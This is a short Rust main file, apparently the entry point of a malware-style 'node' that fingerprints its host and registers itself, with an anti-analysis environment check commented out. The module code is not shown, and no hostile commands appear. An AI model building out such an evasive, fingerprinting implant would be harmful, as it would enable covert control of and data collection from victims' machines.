mod anti_analysis;
mod identity;
mod registration;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Ensure proper environment, otherwise die
    // todo: figure out why this exits on my machine.
    // anti_analysis::check_environment();

    // Scrape identifying info from the machine, and prepare a unique identifier for the node instance
    let identity = identity::init();

    registration::run(&identity).await?;

    Ok(())
}
